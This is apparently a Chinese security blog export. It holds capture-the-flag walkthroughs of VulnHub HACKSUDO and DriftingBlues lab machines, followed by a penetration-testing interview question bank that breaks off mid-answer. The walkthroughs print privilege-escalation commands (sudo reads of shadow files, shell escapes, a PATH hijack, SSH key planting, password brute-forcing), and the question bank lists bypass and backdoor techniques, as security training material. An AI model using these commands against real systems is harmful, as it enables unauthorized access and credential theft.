[{"title":"VulnHub-HACKSUDO:L.P.E.（部分）","path":"/2024/05/06/HACKSUDO-L.P.E./","content":"HACKSUDO: L.P.E.（部分）信息收集主机扫描1nmap -sP 192.168.217.175/24 端口扫描1nmap -A -sV -T4 -p- 192.168.217.185 80端口访问80端口发现是一个登录界面，还有一句提示，飘过来得提示，告诉我们账号密码要在这个页面寻找 通过查看源码在底部注释内容中发现账号密码。进行登录 经过查看发现这个靶机是个用来练习提取得靶机 挑战一：sudo 滥用感觉sudo提权基本都在工具GTFOBins中，地址;https://gtfobins.github.io/ apt-get工具搜索发现命令，执行 arp方法一：通过读取&#x2F;etc&#x2F;shadow 文件尝试获取root密码 1sudo /usr/sbin/arp -vf /etc/shadow 使用工具hashcat进行爆破 前提：好的字典 方法二：使用命令读取 1sudo /usr/sbin/arp -vf /root/root.txt awk base32 图中命令”$LFILE”为需要读取得文件，替换成&#x2F;root&#x2F;root.txt 1sudo base32 /root/root.txt | base32 -d base64 跟上面一样，”$LFILE”替换成&#x2F;root&#x2F;root.txt 1sudo base64 /root/root.txt | base64 -d cat 跟上面差不多原理 1sudo cat /root/root.txt log无环境ssl无环境comm 原理与上面相同 1sudo comm /root/root.txt /dev/null 2&gt;/dev/null cp 1sudo cp &quot;root/root.txt&quot; /dev/stdout curl 1sudo curl file://\\/root/root.txt cut 1sudo cut -d &quot;&quot; -f1 &quot;/root/root.txt&quot; dash date 1sudo date -f &quot;/root/root.txt&quot; diff 1sudo diff --line-format=%L /dev/null /root/root.txt easy无提权办法 find ftp gcc gdb ip 1sudo ip -force -batch &quot;/root/root.txt&quot; pip 靶机环境出现问题 perl 1sudo perl -e &#x27;exec &quot;/bin/sh&quot;;&#x27; socket无环境vi 1sudo vi -c &#x27;:!/bin/sh&#x27; /dev/null view 1sudo view -c &#x27;:!/bin/sh&#x27; wget watch xxd 1sudo xxd &quot;/root/root.txt&quot; | xxd -r zip 挑战二：SUID滥用了解SUID提权 suid(set uid)是linux中的一种特殊权限，suid可以让调用者以文件拥有者身份运行该文件，所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。 suid特点是用户运行某个程序时，如果该程序有suid权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。 linux引入了3个文件来管理用户组： &#x2F;etc&#x2F;passwd存放用户信息。 &#x2F;etc&#x2F;shadow存放用户密码信息。 &#x2F;etc&#x2F;group存放组信息。 在文件系统中的每个文件的文件头里面添加了用户和文件之间的关系信息。 用户信息&#x2F;etc&#x2F;passwd每行共有7个字段冒号隔开： 字段1为用户名。 字段2为用户的密码。 字段3为指UID，每个用户都有自己的uid。 字段4为组UID，每个用户都有不同的uid。 字段5为解释说明的字段。 字段6为指用户的根目录。 字段7为指登录shell，用户登录shell，当前为&#x2F;bin&#x2F;zsh表示可以登录，&#x2F;sbin&#x2F;nologin标识不被授权登录。 ar1find / -perm -4000 -exec ls -al &#123;&#125; \\; 2&gt;/dev/null ash1find / -perm -4000 -exec ls -al &#123;&#125; \\; 2&gt;/dev/null viluhacker(无用户文件夹)1find / -perm -4000 -exec ls -al &#123;&#125; \\; 2&gt;/dev/null base32(与标题不符)1find / -perm -4000 -exec ls -al &#123;&#125; \\; 2&gt;/dev/null bash1find / -perm -4000 -exec ls -al &#123;&#125; \\; 2&gt;/dev/null hackme(无)1find / -perm -4000 -exec ls -al &#123;&#125; \\; 2&gt;/dev/null echmod 有点蒙，以后再说","tags":["靶场，HACKSUDO系列，渗透笔记"],"categories":["靶场，HACKSUDO系列，渗透笔记"]},{"title":"VulnHub--DRIFTINGBLUES: 7","path":"/2024/05/01/blues-7（DRIFTINGBLUES 7)/","content":"VulnHub–DRIFTINGBLUES: 7信息收集主机扫描1nmap -sP 192.168.217.129/24 端口扫描nmap 192.168.217.148 开放的端口不少啊，进行详细扫描nmap -A -sV -T4 -p- 192.168.217.148 22—ssh—OpenSSH 7.4 (protocol 2.0) 66—http—SimpleHTTPServer 0.6 (Python 2.7.5) 80—http—Apache httpd 2.4.6 ((CentOS) OpenSSL&#x2F;1.0.2k-fips 111—rpcbind—2-4 (RPC #100000) 443—ssl&#x2F;http—Apache httpd 2.4.6 ((CentOS) OpenSSL&#x2F;1.0.2k-fips 2403—taskmaster2000? 3306—mysql—MariaDB (unauthorized) 8086—http—InfluxDB http admin 1.7.9 端口分析22端口一般只用来进行暴力破解 80端口 扫描目录发现一个bower.json文件 dirsearch -u 192.168.217.148 -x 403,302 --random-agent 发现Eyes Of Network版本5.3 使用kali搜索一下漏洞库看看有没有漏洞可以利用 searchsploit Eyes Of Network 5.3 渗透过程漏洞利用打开美少妇（msf）搜索关键词Eyes Of Network 查看需要配置的参数show options 配置参数： 12set RHOST 192.168.217.148 目标IPset LHOST 192.168.217.129 监听地址 配置后的参数 配置完成就可以直接进行攻击run或者exploit 进入shell模式cd到root目录查看flag.txt","tags":["靶场，DRIFTINGBLUES系列，渗透笔记"],"categories":["靶场，DRIFTINGBLUES系列，渗透笔记"]},{"title":"VulnHub-DRIFTINGBLUES: 5","path":"/2024/04/09/blues-5（DRIFTINGBLUES 5)/","content":"VulnHub-DRIFTINGBLUES: 5信息收集主机扫描1nmap -sP 192.168.217.129/24 端口扫描1nmap 192.168.217.147 目录扫描1dirsearch -u 192.168.217.147 -e * -x 403 --random-agent 查看80 端口 发现是wordpress ,登录界面根据刚才扫描的目录和常识得知是 &#x2F;wp-admin 使用wpscan 扫一下 1wpscan --url http://192.168.217.147 -e u 发现了五个用户名 12345abuzerkomurcugaddgillcollingsatanic 写到 user.txt中。现在只有用户名没有密码，使用cewl爬取一个 1cewl -m 6 -w pass.txt http://192.168.217.147 渗透过程开始爆破，使用工具wpscan 1wpscan --url http://192.168.217.147 -U user.txt -P pass.txt 得到一组用户名密码：Username: gill, Password: interchangeable 登录wordpress 尝试写入反弹shell，结果失败。看看还有没有其他线索 发现几张图片，有没在前面见过的，那就看看有没有隐写 经过查看发现倒数第二张图片有提示： 经过： 把文件下载下来：wget http://192.168.217.147/wp-content/uploads/2021/02/dblogo.png 使用工具exiftool进行解析 exiftool /home/kali/blues-5/dblogo.png 最后发现了隐藏得 ssh密码：59583hello用户名的话就用之前的那五个用户名试试 ssh登录ssh gill@192.168.217.147 获得第一个flag 还发现一个以kdbx为后缀的文件通过百度发现 KeePass是一个免费的开源密码管理器，它可以帮助您管理 以安全的方式使用您的密码。您可以将所有密码存储在一个密码中 数据库，该数据库使用主密钥锁定。所以你只需要记住一个 单个主密钥来解锁整个数据库。数据库文件已加密 使用目前已知的最佳和最安全的加密算法 （AES-256、ChaCha20 和 Twofish）。 有关详细信息，请参阅功能页面。 kdbx文件密码爆破将文件传到kaliscp -rp gill@192.168.217.147:/home/gill/keyfile.kdbx /home/kali/blues-5 利用keepass2john工具获取其哈希值方便我们进行爆破keepass2john keyfile.kdbx &gt; hash 尝试使用john爆破：john --wordlist=/usr/share/wordlists/rockyou.txt hash 利用获得密码信息使用keepass读取keyfile.kdbx文件，但是里面密码是*号显示并且只显示了标题，用户名显示为空。 定时任务发现直接上脚本：linpeas.sh，在本机开启web服务，然后使用wget下载该文件至&#x2F;tmp目录并执行该文件，发现一个比较特殊的文件：&#x2F;keyfolder，但是查看该文件内信息，显示是一个空的目录。 赋予pspy64执行权限，然后执行该文件，发现会定时执行&#x2F;root&#x2F;key.sh文件，根据名字猜测是和密码有关。 提权后来想着是不是这个脚本将密码写入到了刚才keepass发现的几个标题中去了，然后就尝试在&#x2F;keyfolder目录下创建刚才的几个标题，但是没什么变化，后来就一个一个单独创建，在创建fracturedocean文件时，多出来一个rootcreds.txt文件，读取该文件获得root密码信息：imjustdrifting31。 使用获得密码信息切换到root账户，然后在&#x2F;root目录下发现root.txt文件，读取该文件成功获得flag值。","tags":["靶场，DRIFTINGBLUES系列，渗透笔记"],"categories":["靶场，DRIFTINGBLUES系列，渗透笔记"]},{"title":"blues-4","path":"/2024/04/08/blues-4（DRIFTINGBLUES 4)/","content":"blues-4信息收集主机扫描1nmap -sP 192.168.217.129/24 端口扫描1nmap 192.168.217.145 目录扫描1dirsearch -u 192.168.217.145 -e * -x 403 --random-agent 啥也没有 80端口探查 也是啥也没有 查看源码 发现一段base64 进行编译 渗透寻找漏洞1echo &quot;编译内容&quot; |base64 -d 经过多次编译得到一个文件，进行查看 这应该是brainfuck编码，通过在线网站进行编译 发现了一个图片文件，打开发现是一个二维码。使用在线二维码识别网站识别该二维码： 1https://uutool.cn/qrcode-decode/#:~:text=%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%9C%A8%E7%BA%BF%E8%AF%86%E5%88%AB%EF%BC%8C,%E4%BA%8C%E7%BB%B4%E7%A0%81%E6%96%87%E6%9C%AC%E5%86%85%E5%AE%B9%E3%80%82 发现又是一个图片文件，查看后发现是 文件内容可能是用户名，将它们组成词典，破解一下FTP（21 端口：FTP（File Transfer Protocol）数据传输端口，用于在计算机之间传输文件。） 1234luthergaryhubertclark 组成字典blues-4进行爆破 123hydra -L blues-4 -P /uer/share/wordlists/rockyou.txt ftp://192.168.217.145\t-L用户名字典指定 -P密码字典指定 得到一组用户名和密码，用它登录FTP 12luthermypics 1ftp 192.168.217.145 除了发现目录hubert是可读可写的其他并没有发现什么，突然发现hubert的uid与其他不一样是1001，这可能是一个用户文件夹，也许可以设法将公钥上传至靶机，可以在本地生成公钥私钥，然后将公钥上传到目标主机的hubert目录下 本地生成ssh公私钥上传getshellkali生成密钥ssh-keygen&#x2F;将SSH 公钥文件存为 authorized_keys 主要需要将公钥名称修改为authorized_keys，否则就不能认证通过，这应该与靶机上sshd_config的配置有关，通过ftp上传该公钥，首先需要在靶机上建立.ssh目录,然后使用 ftp 上传 authorized_keys 到靶机里 1234567ftp 192.168.9.26输入账户：luther输入密码：mypicscd hubertmkdir .sshcd .sshput authorized_keys 修改 SSH 私钥为只读权限：chmod 400 authorized_keys 进行ssh远程连接ssh hubert@192.168.217.145 -i authorized_keys 成功拿到第一个flag 提权寻找 suid 程序与命令劫持提权 在https://gtfobins.github.io/未发现可利用的 但发现了一个不常见的程序/usr/bin/getinfo 123456789101112131415161718192021222324252627282930313233hubert@driftingblues:~$ /usr/bin/getinfo###################ip address###################1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 08:00:27:f3:c5:02 brd ff:ff:ff:ff:ff:ff inet 192.168.9.26/24 brd 192.168.9.255 scope global dynamic enp0s3 valid_lft 554sec preferred_lft 554sec inet6 fe80::a00:27ff:fef3:c502/64 scope link valid_lft forever preferred_lft forever###################hosts###################127.0.0.1 localhost127.0.1.1 driftingblues# The following lines are desirable for IPv6 capable hosts::1 localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allrouters###################os info###################Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux 根据上面输出的结果，可以推测这个程序中执行了 ip addr, cat /etc/hosts, uname -a因此，在这种情况下，我们可以在环境变量 PATH 中提供一个目录 (&#x2F;tmp)，并创建一个 ip或者 cat 文件，用于劫持命令，执行我们自定义的二进制文件就可以提权 12345export PATH=/tmp/:$PATHcd /tmpecho &#x27;/bin/bash&#x27; &gt; ipchmod +x ip/usr/bin/getinfo 成功提权，并在root目录下找到第二个flag","tags":["靶场，DRIFTINGBLUES系列，笔记"],"categories":["靶场，DRIFTINGBLUES系列，笔记"]},{"title":"网络安全题库","path":"/2024/04/02/面试题库/","content":"以下文章皆来源于网络，侵权删 1.php爆绝对路径的方法？1.1单引号引起数据库报错 说明：直接在URL后面加单引号，要求单引号没有被过滤(gpc&#x3D;off)且服务器默认返回错误信息。 举例：https://www.xxx.com/news.php?id=149‘ 1.2访问错误参数或错误路径 说明：将要提交的参数值改成错误值，比如**-1** 举例：https://www.xxx.com/researcharchive.php?id=-1 1.3扫描开发未删除的测时文件&#x2F;探针类文件如phpinfo 说明：部分开发人员和测试人员会将测试文件留着，这样可以借助扫描工具将其扫描出来也可以爆绝对路径。很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo() 举例： https://www.xxx.com/test.php https://www.xxx.com/ceshi.php https://www.xxx.com/info.php https://www.xxx.com/phpinfo.php https://www.xxx.com/php_info.php https://www.xxx.com/1.php 1.4google hacking 说明：结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。 举例：Site:xxx.edu.tw warning ​ Site:xxx.com.tw “fatal error” 1.5phppmyadmin爆路径:&#x2F;phpmyadmin&#x2F;libraries&#x2F;lect_lang.lib.php 说明：一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。至于phpmyadmin的地址可以用wwwscan这类的工具去扫，也可以选择google。PS：有些BT网站会写成phpMyAdmin。 举例： https://www.xxxx.cc/phpmyadmin/themes/darkblue_orange/layout.inc.php https://www.xxx.cc/phpmyadmin/libraries/select_lang.lib.php https://www.xxx.cc/phpmyadmin/libraries/mcrypt.lib.php https://www.xxxx.cc/phpmyadmin/index.php?lang[]=1 1.6利用漏洞读取配置文件找路径 说明：如果注入点有文件读取权限，就可以手工load_file或工具读取配置文件，再从中寻找路径信息（一般在文件末尾）。各平台下Web服务器和PHP的配置文件默认路径可以上网查 举例; Windows: c:windowsphp.iniphp\t配置文件 c:windowssystem32inetsrvMetaBase.xml IIS虚拟主机配置文件 Linux &#x2F;etc&#x2F;php.ini\tphp配置文件 &#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;php.conf &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf\tApache配置文件 &#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;httpd.conf &#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf 虚拟目录配置文件 1.7恶意使用网站功能说明：如本地图片读取功能读取不存在图片，上传点上传不能正常导入的文件； 2.你常用的渗透工具有哪些，最长用的时那个burp、nmap、sqlmap、awvs、蚁剑、冰蝎、dirsearch、御剑等等 3.xss盲打到内网服务器的利用 钓鱼管理员 信息收集 4.鱼叉式攻击和水坑攻击？ 鱼叉攻击：指利用木马程序作为电子邮件的附件，发送到目标电脑上，诱导受害者去打开附件来感染木马 水坑攻击：分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，将网站攻破并植入恶意程序，等待目标访问 5.什么是虚拟机逃逸？利用虚拟机软件或者虚拟机中运行的软件的漏洞进行攻击，以达到攻击或控制虚拟机宿主操作系统的目的 6.中间人攻击的原理并且如何防御 原理：在同一个局域网中，通过拦截正常的网络通信数据，并进行数据篡改和嗅探 防御： 在主机绑定网关MAC与IP地址为静态 在网关绑定主机MAC与IP地址 使用ARP防火墙 7.TCP三次握手过程？ 第一次握手：建立连接时,客户端发送syn包(syn&#x3D;j)到服务器,并进入SYN_SEND状态,等待服务器确认 第二次握手：服务器收到syn包,必须确认客户的SYN（ack&#x3D;j+1）,同时自己也发送一个SYN包（syn&#x3D;k）,即SYN+ACK包,此时服务器进入SYN_RECV状态 第三次握手：客户端收到服务器的SYN＋ACK包,向服务器发送确认包ACK(ack&#x3D;k+1),此包发送完毕,客户端和服务器进入ESTABLISHED状态 8.七层模型？应用层、表示层、会话层、传输层、网络层、数据链路层、物理层 9.对于云安全的理解融合了并行处理、网格计算、未知病毒行为判断等新兴技术和概念，通过网状的大量客户端对网络中软件行为的异常监测，获取互联网中木马、恶意程序的最新信息，传送到Server端进行自动分析和处理，再把病毒和木马的解决方案分发到每一个客户端 10.了解过websocket吗？WebSocket是一种在单个TCP连接上进行全双工通信的协议，最大特点是服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话。 11.DDOS是什么？有哪些？CC攻击是什么？区别是什么？ DDOS：分布式拒绝服务攻击，利用合理的服务请求来占用过多的服务资源，从而使合法用户无法得到服务的响应 主要方式： SYN Flood UDP Flood ICMP Flood Connection Flood HTTP Get UDP DNS Query Flood CC攻击：模拟多个正常用户不停地访问如论坛这些需要大量数据操作的页面，造成服务器资源的浪费，CPU长时间处于100%，网络拥塞 两者区别： CC攻击网页，DDOS攻击服务器，更难防御 CC门槛较低，DDOS需要大量服务器 CC持续时间长，DDOS产生的影响大 12.land攻击是什么局域网拒绝服务攻击，DDOS攻击的一种，通过发送精心构造的、具有相同源地址和目标地址的欺骗数据包，致使缺乏相应防护机制的目标设备瘫痪 13.你会如何进行信息收集？ 服务器信息：ip、中间件、操作系统 域名whois、ipwhois、网段归属 子域名探测 网站目录扫描、接口信息扫描 端口扫描 各大引擎搜索相关信息 14.什么是CRLF注入攻击？通过“回车”和“换行”字符注入HTTP流，实现网站篡改、跨站脚本、劫持等。 15.防止XSS，前端后端两个角度？ 前端： 用户输入特殊字符过滤转义为html实体 用户输出编码 后端： 实体化编码 函数过滤 限制字符长度 16.如何防护一个端口的安全？ 利用WAF、IDS、IPS等设备 危险服务端口禁止对外访问或限制IP访问 服务定期更新版本 17.webshell检测思路？ 静态检测：匹配特征码，特征值，危险函数 动态检测：WAF、IDS等设备 日志检测：通过IP访问规律，页面访问规律筛选 文件完整性监控 18.发现IIS的网站，怎样试它的漏洞？（根据版本）mp.weixin.qq.com&#x2F;s&#x2F;5XV984kEr… 19.GPC是什么？开启了怎么绕过 GPC： php.ini配置文件中的magic_quotes_gpc，实现为get、post、cookie传入的单引号、双引号、反斜线、NULL字符添加反斜线\\ 绕过： PHP5的GPC对$_SERVER的忽略，可在http请求头注入 二次注入 宽字节注入 20.web常用的加密算法有什么 单向散列加密 MD5、SHA、MAC 对称加密 AES、DES 非对称加密 RSA、RSA2 21.XSS除了获取cookies还能做什么？ 获取管理员ip xss蠕虫 钓鱼攻击 前端JS挖矿 键盘记录 屏幕截图 22.运营商（或其他）网络劫持 运营商劫持：广告投放 DNS劫持：通过各种手段篡改DNS，劫持网络 23.DNS欺骗是什么攻击者冒充域名服务器的一种欺骗行为 24.缓冲区溢出原理和防御 原理： 当写入缓冲区的数据量超过该缓冲区所能承受的最大限度时，发生缓冲区溢出，溢出的数据被黑客加以利用，形成远程代码执行漏洞。 防御： 基于操作系统防御 缓冲区边界检查 安全编程 25.网络安全事件应急响应 断网：条件允许时优先断网，防止黑客进一步操作或删除痕迹 取证：通过分析登录日志、网站日志、服务日志寻找黑客ip，查看黑客进行的操作 备份：备份服务器文件，对比入侵前后产生变化的文件 查漏：通过上述步骤寻找业务薄弱点，修补漏洞 杀毒：清除黑客留下的后门、webshell、管理账号 溯源：通过黑客ip地址，入侵手段等 记录：归档、预防 26.企业内部安全 实名制联网 重要网段隔离 禁止接入任何USB设备 禁用WIFI网络 IP与MAC地址绑定 部署网络监控、IDS、IPS设备 定期培训，提高员工安全意识 27.业务上线前，怎么测试，从哪些角度测试 安全测试：寻找产品漏洞，页面漏洞，服务漏洞，敏感信息泄露，逻辑漏洞，弱口令 性能测试：压力测试 功能完整性测试 28.应用有漏洞，但是无法修复和停用，你怎么办 限制IP白名单访问 使用WAF、IDS、防火墙设备 29.CSRF怎么防护？ 验证HTTP Referer字段 添加Token字段并验证 添加自定义字段并验证 30.文件上传绕过方法？ WAF绕过： 修改上传表单字段 表单字段大小写替换 表单字段增加或减少空格 表单字段字符串拼接 构造双文件上传表单，同时上传双文件 编码绕过 垃圾数据填充绕过 文件名大小写绕过 服务器检测绕过： MIME类型绕过 前端JS检测抓包改包绕过 黑名单绕过：php3、asa、ashx、windows特性（test.asp_、流特性）、apache解析漏洞 图片内容检测使用图片马绕过 .htassess绕过 白名单检测绕过： 截断上传绕过 IIS6&#x2F;7&#x2F;7.5解析漏洞，nginx低版本解析漏洞 文件包含绕过 31.验证码相关利用点 验证码复用 验证码可识别 验证码失效 验证码DDOS 32.cookie你会测试什么内容 sql注入 xss 权限绕过 敏感信息泄露 33.说出几个业务逻辑漏洞类型？ 任意用户密码重置 短信轰炸 订单金额修改 忘记密码绕过 恶意刷票 验证码复用 34.简述文件包含漏洞调用文件包含函数时，未严格限制文件名和路径，如include()、require()等函数 35.业务逻辑漏洞，用户任意密码重置有什么例子，因为什么因素导致的？ 普通用户重置管理用户密码 普通用户重置普通用户密码 未设置用户唯一Token，导致越权 36.渗透测试过程中发现一个只能上传zip文件的功能，有什么可能的思路？ shell压缩上传，程序自解压getshell 尝试解析漏洞getshell 寻找文件包含漏洞 木马钓鱼管理员 37.为什么aspx木马权限比asp大？aspx使用的是.net技术,IIS中默认不支持，ASPX需要依赖于.net framework，ASP只是脚本语言, 入侵的时候asp的木马一般是guest权限APSX的木马一般是users权限 38.只有一个登录页面有哪些思路？ SQL注入、万能密码 暴力破解 权限绕过 目录扫描 敏感信息泄露 39.请求头中哪些是有危害的？ COOKIE注入 user-agent注入 X-Forwarded-For注入 Referer注入 40.谈谈水平&#x2F;垂直&#x2F;未授权越权访问的区别? 水平越权：普通用户越权访问普通用户 垂直越权：普通用户越权访问管理用户 未授权访问：权限控制不严，导致无需登录访问已登录用户页面 41.xss有什么？执行存储型的xss的危害和原理 存储型、反射型、DOM型 原理： 存储型XSS是指应用程序通过Web请求获取不可信赖的数据，在未检验数据是否存在XSS代码的情况下，便将其存入数据库 存储型XSS危害： 窃取用户Cookie XSS钓鱼攻击 XSS蠕虫攻击 获取键盘记录 获取用户信息 获取屏幕截图 42.主机疑似遭到入侵，要看哪里的日志 系统登录日志 服务访问日志 网站日志 数据库日志 43.python常用的标准库 正则表达式 re 时间模块 time 随机数 random 操作系统接口 os 科学计算 math 网络请求 urlib http库 requests 爬虫库 Scrapy 多线程库 threading 44.reverse_tcp 和 bind_tcp 的区别？ reverse_tcp：攻击机设置一个端口和IP，Payload在测试机执行连接攻击机IP的端口，这时如果在攻击机监听该端口会发现测试机已经连接 白话就是让受控机主动连接我们 bind_tcp：攻击机设置一个端口（LPORT），Payload在测试机执行打开该端口，以便攻击机可以接入 白话就是我们主动连接受控机 使用reverse_tcp较为安全，一般不会被防火墙发现 45.oauth认证过程中可能会出现什么问题，导致什么样的漏洞? CSRF redirect_uri校验不严格 错误的参数传递 46.做了cdn的网站如何获取真实IP 全球ping 查询历史解析记录 探针文件如phpinfo等 利用命令执行连接我们的服务器或DNSlog 寻找网站配置 通过二级域名 全网扫描，title匹配 47.如何实现跨域？ jsonp CORS跨域资源共享 代理跨域请求 Html5 postMessage 方法 修改 document.domain 跨子域 基于 Html5 websocket 协议 document.xxx + iframe 48.jsonp跨域与CORS跨域的区别？ jsonp浏览器支持较好，CORS不支持IE9及以下浏览器 jsonp只支持GET，CORS支持所有类型的HTTP请求 jsonp只发一次请求，复杂请求CORS发送两次 49.SSRF漏洞利用？ 本地文件读取 服务探测、端口扫描 攻击内网redis、mysql、fastcgi等服务 利用到的协议有：http&#x2F;s、file、gopher、tftp、dict、ssh、telnet 50.常见后门方式？ Windows: 注册表自启动 shift后门 远控软件 webshell 添加管理用户 影子用户 定时任务 dll劫持 注册表劫持 MBR后门 WMI后门 管理员密码记录 Linux: SSH后门 SUID后门 Crontab计划任务 PAM后门 添加管理员账号 Rootkit Rootkit 51.open_basedir访问目录限制绕过方法？ 使用命令执行函数绕过 使用symlink()函数绕过 glob伪协议绕过 52.PHP代码审计中容易出问题的点？ 参数拼接方式皆有可能产生SQL注入（老生常谈） 全局变量注册导致的变量覆盖 fwrite参数未过滤导致的代码执行 权限校验疏漏导致的后台功能访问 接口任意文件上传 unserialize反序列化漏洞 53.红蓝对抗中蓝队反杀红队场景和姿势？钓鱼、蜜罐、蚁剑RCE 54.linux计划任务，黑客隐藏自己的计划任务会怎么做？临时任务：at、batch命令 55.Redis未授权常见getshell的几种方式？ web绝对路径写shell 写入ssh公钥获取服务器权限 主从复制getshell 56.JWT的攻击手法？（头部、负载、签名） 加密算法置为空绕过身份验证 爆破弱密钥 kid参数：任意文件读取、SQL注入、命令注入 未校验签名，内容重新编码 57.JAVA中间件的漏洞，举几个例子？ JBoss反序列化 WebLogic反序列化 Tomcat任意文件写入、弱口令+后台getshell 58.DNS外带可以用在哪些漏洞？ SQL盲注 无回显的命令执行 XXE盲打 SSRF盲打 59.HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie劫持登录页面钓鱼绕过 60.中间件漏洞总结？这里只写常利用的漏洞 IIS: IIS6.0 PUT漏洞 IIS6.0 远程代码执行漏洞 IIS6.0 解析漏洞 IIS启用.net 短文件名漏洞 IIS7.0&#x2F;7.5 解析漏洞 Apache: 未知扩展名解析漏洞 配合错误导致的解析漏洞、目录遍历 Nginx： 配置错误导致的解析漏洞、目录遍历 Tomcat: 配置错误导致的任意代码执行、任意文件写入漏洞 弱口令+管理后台war包部署getshell manager&#x2F;html管理后台弱口令爆破 JBoss: 5.x&#x2F;6.x反序列化漏洞（CVE-2017-12149） JMXInvokerServlet反序列化 EJBInvokerServlet反序列化 JMX Console未授权访问 弱口令+管理后台war包部署getshell WebLogic: XMLDecoder 反序列化漏洞（CVE-2017-10271 &amp; CVE-2017-3506) wls9_async_response,wls-wsat 反序列化远程代码执行漏洞（CVE-2019-2725） WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628） 弱口令+管理后台war包部署getshell 61.谈一谈Windows系统与Linux系统提权的思路？ Windows: 数据库提权：mysql、sqlserver 第三方软件提权：serv-u DLL劫持 系统内核溢出漏洞提权：cve系列 Linux： sudo提权 suid提权 redis 内核提权 62.python有哪些框架，其中出现过哪些漏洞 Django、Flask、Scrapy Django任意代码执行 Flask模板注入 63.小程序的渗透和普通渗透的差异 渗透过程不变，依旧是抓包修改参数渗透 不同点是小程序会将包下载到本地，可以使用逆向还原工具反编译 64.app本身的漏洞测试 四大组件 Activity组件: activity绑定browserable与自定义协议 ActivityManager漏洞 Service组件: 权限提升，拒绝服务攻击 Broadcast Receiver组件: 权限管理不当 BroadcastReceiver导出漏洞 动态注册广播组件暴露漏洞 Content Provider组件: 读写权限漏洞 Content Provider中的SQL注入漏洞 Provider文件目录遍历漏洞 65.IDS&#x2F;IPS防护原理及绕过思路 原理： ​\tIDS工作在网络层，旁路部署，通过抓取和分析网络流量来发现攻击 IPS一般也是在网络层旁路，可以理解为具备阻断能力的IDS，是IDS的升级版（也有IDS检测到攻击通知阻断设备执行阻断动作的设备联动模式），可以覆盖网络层和应用层 绕过： TCP分片：拆分出两个TCP包 IP分片：原理同TCP分片，但是丢包严重 程序bug&#x2F;性能问题：发送大量无效包，消耗IPS性能 伪造TCP状态：绕过基于状态追踪的IPS IPV6绕过：使用IPV6地址绕过 66.json的csrf的利用使用XMLHttpRequest、fetch构造出JSON请求，利用Flash的跨域与307跳转来绕过http自定义头限制 67.json格式的数据包可以测哪些漏洞 csrf json劫持 xss 68、简述xxe漏洞原理XML外部实体注入，在应用程序解析XML输入时，当允许引用外部实体时，可构造恶意内容，产生 漏洞 69.内网服务器，如何进行信息收集？ 使用脚本收集：端口信息、服务信息 系统命令收集：域内用户可使用域命令收集域信息，net group “domain users” &#x2F;domain等 端口扫描工具全段扫描 本机信息收集：管理密码、登录日志看管理员ip、服务密码收集、网段 信息查看、历史记录查看 内网DNS域传送漏洞 70.如果拿下了内网边界层的某一个机器，如何对内网其 他进行探测？ 首先使用代理进入内网reg、ew等 第二在本机进行信息收集，包括管理员ip、端口服务、账号密码、路由信息、网段信息等 第三扩展到收集到的网段进行渗透，利用常用服务:SMB、MYSQL、SQLserver、ftp、telnet等 借助轻量化脚本或扫描器扫描，但一般不这么做，动静太大容易被管理员发现 71.什么时SQL注入攻击 攻击者在HTTP请求中注入恶意的SQL代码，服务器使用参数构建数据库SQL命令时，恶意SQL被一起构 造，并在数据库中执行。 用户登录，输入用户名 lianggzone，密码 ‘ or ‘1’&#x3D;’1 ，如果此时使用参数构造的方式，就会出现 select * from user where name &#x3D; ‘lianggzone’ and password &#x3D; ‘’ or ‘1’&#x3D;‘1’ 不管用户名和密码是什么内容，使查询出来的用户列表不为空。如何防范SQL注入攻击使用预编译的 PrepareStatement是必须的，但是一般我们会从两个方面同时入手。 Web端： 有效性检验。 限制字符串输入的长度。 服务端 ： 不用拼接SQL字符串。 使用预编译的PrepareStatement。 有效性检验。(为什么服务端还要做有效性检验？第一准则，外部都是不可信的，防止攻击者绕过 Web端请求) 过滤SQL需要的参数中的特殊字符。比如单引号、双引号。 72.什么是XSS攻击跨站点脚本攻击，指攻击者通过篡改网页，嵌入恶意脚本程序，在用户浏览网页时，控制用户浏览器进 行恶意操作的一种攻击方式。 如何防范XSS攻击 ： 前端，服务端，同时需要字符串输入的长度限制。 前端，服务端，同时需要对HTML转义处理。将其中的”&lt;”,”&gt;”等特殊字符进行转义编码。 防 XSS 的核心是必须对输入的数据做过滤处理。 73.什么是CSRF攻击跨站点请求伪造，指攻击者通过跨站请求，以合法的用户的身份进行非法操作。 可以这么理解CSRF攻 击：攻击者盗用你的身份，以你的名义向第三方网站发送恶意请求。CRSF能做的事情包括利用你的身份 发邮件，发短信，进行交易转账，甚至盗取账号信息。 如何防范CSRF攻击： 安全框架，例如Spring Security。 token机制，在HTTP请求中进行token验证，如果请求中没有token或者token内容不正确，则认为CSRF 攻击而拒绝该请求。 验证码。通常情况下，验证码能够很好的遏制CSRF攻击，但是很多情况下，出于用户体验考虑，验证码 